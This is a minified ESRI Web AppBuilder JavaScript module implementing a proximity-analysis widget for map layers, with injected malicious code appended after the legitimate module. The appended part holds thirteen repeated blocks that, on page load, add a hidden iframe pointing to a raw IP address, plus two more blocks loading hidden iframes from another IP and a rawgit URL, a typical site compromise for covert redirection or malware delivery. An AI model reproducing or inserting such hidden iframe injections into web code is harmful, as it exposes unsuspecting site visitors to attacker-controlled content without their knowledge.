// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/Color dojo/_base/array dojo/DeferredList dojo/Deferred dojo/dom-class dojo/dom-construct dojo/dom-geometry dojo/dom-style dojo/on esri/graphic esri/Color esri/layers/FeatureLayer esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/Font esri/symbols/TextSymbol esri/tasks/query esri/geometry/geometryEngine jimu/utils ./analysisUtils".split(" "),function(O,k,J,E,G,F,w,z,P,K,D,L,Q,B,M,N,R,S,T,x,U,t){return O("ProximityInfo",
null,{featureCount:0,mapServiceLayer:!1,loading:!1,queryOnLoad:!1,incidentCount:0,constructor:function(a,e,f){this.tab=a;this.container=e;this.parent=f;this.graphicsLayer=this.incident=null;this.specialFields={};this.typeIdField="";this.types=[];this.dateFields={};this.config=f.config;this.baseLabel=""!==a.label?a.label:a.layerTitle?a.layerTitle:a.layers},queryTabCount:function(a,e,f,g){var d=new F;this.incidentCount=a.length;var b=[this.tab.tabLayers[0]];this.mapServiceLayer&&1<this.tab.tabLayers.length&&
(b=[this.tab.tabLayers[1]]);if(0<this.tab.tabLayers.length&&this.tab.tabLayers[0].url&&-1<this.tab.tabLayers[0].url.indexOf("MapServer")){this.mapServiceLayer=!0;var c;"undefined"!==typeof this.tab.tabLayers[0].infoTemplate?(this.summaryLayer=this.tab.tabLayers[0],this.summaryLayer.hasOwnProperty("loaded")&&this.summaryLayer.loaded?(this.summaryFields=this._getFields(this.summaryLayer),this._performQuery(a,e,f,g,b).then(function(a){d.resolve(a)})):(c=new B(this.summaryLayer.url),c.infoTemplate=this.tab.tabLayers[0].infoTemplate,
b=[c],this.tab.tabLayers=b,D(c,"load",k.hitch(this,function(){this.summaryLayer=c;this.summaryFields=this._getFields(this.summaryLayer);this._performQuery(a,e,f,g,b).then(function(a){d.resolve(a)})})))):this.loading||(c=new B(this.tab.tabLayers[0].url),this.loading=!0,D(c,"load",k.hitch(this,function(){this.summaryLayer=c;this.summaryFields=this._getFields(this.summaryLayer);for(var b=this.tab.tabLayers[0].url.split("MapServer/")[1],k=this.parent.map.itemInfo.itemData.operationalLayers,v=0;v<k.length;v++){var q=
k[v];if("undefined"!==typeof q.layerObject&&q.layerObject.infoTemplates&&(q=q.layerObject.infoTemplates[b])){c.infoTemplate=q.infoTemplate;break}}this.tab.tabLayers=[c];this.loading=!1;this._performQuery(a,e,f,g,this.tab.tabLayers).then(function(a){d.resolve(a)})})))}this.mapServiceLayer||this._performQuery(a,e,f,g,b).then(function(a){d.resolve(a)});return d},_performQuery:function(a,e,f,g,d){var b=new F,c=[],h,p;0<e.length?p=t.getGeoms(e):0<a.length&&(p=t.getGeoms(a));this.summaryGeoms=p;if(0<p.length)for(a=
0;a<p.length;a++)c=p[a],e=t.createDefArray(d,c),h=0===a?c=e:c=h.concat(e);(new G(c)).then(k.hitch(this,function(a){for(var c=0,e=0;e<a.length;e++){var d=a[e][1];isNaN(d)?d&&d.features?c+=d.features.length:d&&"undefined"!==typeof d.length&&(c+=d.length):c+=d}this.updateTabCount(c,f,g);b.resolve(c)}));return b},updateTabCount:function(a,e,f){this.featureCount=a;t.updateTabCount(this.featureCount,e,f,this.baseLabel,this.incidentCount)},updateForIncident:function(a,e,f,g,d,b){this.incidentCount=a.length;
this.allFields="undefined"!==typeof d&&"undefined"!==typeof b?d?!0:b:!1;var c="undefined"!==typeof g,h;E.forEach(this.tab.tabLayers,k.hitch(this,function(b){c&&(h=new F);if(b.url){var d=new B(b.url,{mode:B.MODE_ONDEMAND,infoTemplate:b.infoTemplate});D(d,"load",k.hitch(this,function(){this.tab.tabLayers=[d];c?this.processIncident(a,e,f,g).then(k.hitch(this,function(a){h.resolve(a)}),k.hitch(this,function(a){console.error(a);h.reject(a)})):this.processIncident(a,e,f,g)}))}else c?this.processIncident(a,
e,f,g).then(k.hitch(this,function(a){h.resolve(a)}),k.hitch(this,function(a){console.error(a);h.reject(a)})):this.processIncident(a,e,f,g)}));if(c)return h},processIncident:function(a,e,f,g){this.incidents=a;var d=[],b;if(0===e.length)for(var c=0;c<a.length;c++)b=a[c],b=b.geometry?b.geometry:b,"polygon"===b.type?(e.push(b),d.push({geometry:b,buffer:b})):d.push({geometry:void 0,buffer:void 0});else for(c=0;c<a.length;c++){b=a[c];var h=e[c].geometry?e[c].geometry:e[c];b=b.geometry?b.geometry:b;d.push({geometry:b,
buffer:h})}if(0!==e.length){for(a=0;a<d.length;a++)if(e=d[a].buffer,"undefined"!==typeof e)for(b=0;b<d.length;b++)if(b!==a&&(c=d[b].buffer,"undefined"!==typeof c&&x.overlaps(e,c))){d[a].buffer=x.difference(e,c);d[b].buffer=x.difference(c,e);c=x.union(c,e);c=x.difference(c,d[a].buffer);c=x.difference(c,d[b].buffer);if(Array.isArray(d[a].geometry)){if(Array.isArray(d[b].geometry))for(h=0;h<d[b].geometry.length;h++)d[a].geometry.push(d[b].geometry[h]);else d[a].geometry.push(d[b].geometry);h=d[a].geometry}else if(h=
[],h.push(d[a].geometry),Array.isArray(d[b].geometry))for(var p=0;p<d[b].geometry.length;p++)h.push(d[b].geometry[p]);else h.push(d[b].geometry);d.push({geometry:h,buffer:c})}var v,q="undefined"!==typeof g;q?v=new F:(this.container.innerHTML="",w.add(this.container,"loading"));var l=[];this.graphicsLayer=f;f=this.tab.tabLayers[0];var u=this._getFields(f);g=[];for(a=0;a<d.length;a++)e=new T,e.returnGeometry=!0,e.outSpatialReference=this.parent.map.spatialReference,e.geometry=d[a].buffer,e.outFields=
"true"===this.parent.config.csvAllFields||!0===this.parent.config.csvAllFields?["*"]:u,"undefined"!==typeof f.queryFeatures&&g.push(f.queryFeatures(e));(new G(g)).then(k.hitch(this,function(a){for(var b=0;b<a.length;b++){var c=a[b][1];if(c&&c.features)for(var c=c.features,e=d[b].geometry,f=0;f<c.length;f++){var h=c[f],g=h.geometry,n;if(Array.isArray(e)){var m;for(n=0;n<e.length;n++){var r=t.getDistance(e[n],g,this.parent.config.distanceUnits);if("undefined"===typeof m||r<m)m=r}n=m;g={DISTANCE:m}}else n=
t.getDistance(e,g,this.parent.config.distanceUnits),g={DISTANCE:n};for(r=0;r<u.length;r++)g[u[r]]=h.attributes[u[r]];!0===this.config.csvAllFields||"true"===this.config.csvAllFields?h.attributes.DISTANCE=n:h.attributes=g;l.push(h)}}l.sort(t.compareDistance);if(q){var p={graphics:l,analysisResults:l.length,context:this};this._processResults(l,!0).then(k.hitch(this,function(a){v.resolve(k.mixin(p,a))}))}else this._processResults(l)}),k.hitch(this,function(a){console.error(a);v.reject(a)}));if(q)return v}},
_processResults:function(a,e){var f,g,d=a&&0<a.length;if(d&&"point"!==a[0].geometry.type)for(var b=a.length-1;0<=b;b--)"undefined"===typeof a[b].geometry.getExtent()&&a.splice(b,1);e?f=new F:(this.container.innerHTML="",w.remove(this.container,"loading"),this.graphicsLayer.clear(),d&&(g=z.create("div",{"class":"SAT_tabPanelContent"},this.container),b=z.create("div",{},g),w.add(b,"SATcolExport"),w.add(b,this.parent.lightTheme?"lightThemeBorder":"darkThemeBorder"),b=z.create("div",{title:this.parent.nls.downloadCSV},
b),w.add(b,"btnExport"),D(b,"click",k.hitch(this,this._exportToCSV,a))));var b=this.parent.nls[this.parent.config.distanceUnits],c;"undefined"!==typeof this.tab.advStat&&"undefined"!==typeof this.tab.advStat.stats&&"undefined"!==typeof this.tab.advStat.stats.outFields?c=this.tab.advStat.stats.outFields:(c=[],0<this.tab.tabLayers.length&&E.forEach(this.tab.tabLayers,k.hitch(this,function(a){"undefined"!==typeof a.popupInfo?E.forEach(a.popupInfo.fieldInfos,k.hitch(this,function(a){if(a.visible){var b=
{value:0};b.expression=a.fieldName;b.label=a.label;c.push(b)}})):a.infoTemplate?E.forEach(a.infoTemplate.info.fieldInfos,k.hitch(this,function(a){if(a.visible){var b={value:0};b.expression=a.fieldName;b.label=a.label;c.push(b)}})):E.forEach((a.layerObject?a.layerObject:a).fields,k.hitch(this,function(a){var b={value:0};b.expression=a.name;b.label=a.alias;c.push(b)}))})));var h=220,p=[];if(d)for(var v=0;v<a.length;v++){var q=v+1,l=a[v],u=l.geometry,x=u;"point"!==u.type&&(x=u.getExtent().getCenter());
var u=l.attributes,B;"point"===this.incidents[0].geometry.type&&(B=Math.round(100*u.DISTANCE)/100+" "+b+" ("+this.parent.nls.approximate+")");var C="",y=0,A=[];if("undefined"!==typeof c){for(var I=0;I<c.length;I++){var G=c[I],n;for(n in u)if("DISTANCE"!==n&&3>y&&G.expression===n){var m=t.getFieldValue(n,u[n],this.specialFields,this.dateFields,"longMonthDayYear",this.typeIdField,this.types),m="undefined"!==typeof m&&null!==m?U.stripHTML(m.toString()):"",r,H=l._layer&&l._layer.fields?l._layer.fields:
this.tab.tabLayers&&this.tab.tabLayers[0]?this.tab.tabLayers[0].fields:void 0;H&&(H=t.getField(H,n))&&(r=H.alias);if("undefined"===typeof r||r in[""," ",null,void 0])r=n;t.isURL(m)?m='\x3ca href\x3d"'+m+'" target\x3d"_blank" style\x3d"color: inherit;"\x3e'+r+"\x3c/a\x3e":t.isEmail(m)&&(m='\x3ca href\x3d"mailto:'+m+'" style\x3d"color: inherit;"\x3e'+r+"\x3c/a\x3e");C+=m+"\x3cbr/\x3e";y+=1;A.push({label:r,value:m})}}0<A.length&&p.push(A)}e||(l=z.create("div",{},g),w.add(l,"SATcolRec"),w.add(l,this.parent.lightTheme?
"lightThemeBorder":"darkThemeBorder"),y=z.create("div",{},l),w.add(y,"SATcolRecBar"),A=z.create("div",{innerHTML:q},y),w.add(A,"SATcolRecNum"),K.set(A,"backgroundColor",this.parent.config.activeColor),D(A,"click",k.hitch(this,this._zoomToLocation,x)),B&&(A=z.create("div",{innerHTML:B},y),w.add(A,"SATcolDistance")),this.parent.config.enableRouting&&(y=z.create("div",{title:this.parent.nls.get_directions},y),w.add(y,"SATcolDir"),D(y,"click",k.hitch(this,this._routeToIncident,x))),C=z.create("div",{"class":"SATcolWrap",
innerHTML:C},l),w.add(C,"SATcolInfo"),h+=P.position(l).w,C=new N(N.STYLE_SOLID,new J.fromString(this.parent.config.activeMapGraphicColor),1),C=new M(M.STYLE_CIRCLE,24,C,new J.fromString(this.parent.config.activeMapGraphicColor)),l=new R,l.family="Arial",l.size="12px",q=new S(q,l,new Q(this.parent.config.fontColor)),q.setOffset(0,-4),this.graphicsLayer.add(new L(x,C,u)),this.graphicsLayer.add(new L(x,q,u)))}if(!e&&d)K.set(g,"width",h+"px");else return f.resolve({reportResults:p}),f},_exportToCSV:function(a,
e,f,g){a=t.exportToCSV(a,e,f,g,{type:"proximity",baseLabel:this.baseLabel,csvAllFields:this.parent.config.csvAllFields,layer:this.tab.tabLayers[0],opLayers:this.parent.opLayers,nlsValue:this.parent.nls.proximity,nlsCount:this.parent.nls.count});this.summaryLayer=a.summaryLayer;return a.details},_getFields:function(a){a=t.getFields(a,this.tab,this.allFields,this.parent);this.dateFields=a.dateFields;this.specialFields=a.specialFields;this.typeIdField=a.typeIdField;this.types=a.types;this.displayFields=
t.getDisplayFields(this.tab);return a.fields},_zoomToLocation:function(a){this.parent.zoomToLocation(a)},_routeToIncident:function(a){this.parent.routeToIncident(a)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});